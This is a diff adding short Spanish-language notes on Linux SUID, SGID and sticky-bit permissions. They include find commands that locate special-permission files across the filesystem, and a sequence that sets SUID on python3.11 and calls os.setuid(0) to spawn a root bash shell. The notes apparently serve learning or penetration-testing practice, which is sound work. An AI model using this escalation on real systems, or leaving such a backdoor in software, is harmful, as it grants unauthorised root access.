@@ -1,0 +1,37 @@
+
+                  SUID         +4000     o      u+s            'chmod'
+                  SGID         +2000     o      g+s            'chmod'
+            sticky bit         +1000     o      o+t            'chmod'
+
+                               +7000               
+
+
+
+# BUSCAR ARCHIVOS CON PERMISO SUID ACTIVADO ('::: chmod u+s fileName   ::: chmod 4000 fileName')
+  ::: find / -type f -perm -4000  2>/dev/null                 '::: chmod +4000 ./fileName'
+  ::: find / -type f -perm -2000  2>/dev/null                 '::: chmod +2000 ./fileName'               
+  ::: find / -type f -perm -1000  2>/dev/null                 '::: chmod +1000 ./fileName'
+
+
+
+
+  ::: find / -type f -perm -2000  2>/dev/null
+
+  ::: find / -type f -perm -4000 -exec cp {} ./ruta/dirName \;  'copiar todos los archivos al directorio dirName'
+
+  ::: find / -type f -perm -4000 -o -perm -2000 -o perm -1000 2>/dev/null     '<3...  busca los 3  :3 <3...'
+
+
+# SUID  python      
+                    ''::: which python3.11 | xargs sudo chmod u+s && which pyhton3.11 | xargs ls -lah''
+                  ''::: which python3.11 | xargs sudo chmod +4000 && which pyhton3.11 | xargs ls -lah''
+
+  ::: which python3.11 | xargs ls -lah
+
+    -rwsr-xr-x 1 root root 6.6M Mar 13 07:18 /usr/bin/python3.11
+
+   :: /usr/bin/python3.11
+   :: import os
+   :: os.setuid(0)
+   :: os.system("id")
+   :: os.system("bash")       'lanza bash bajo el setuid 0 (root), vale para zsh igual'
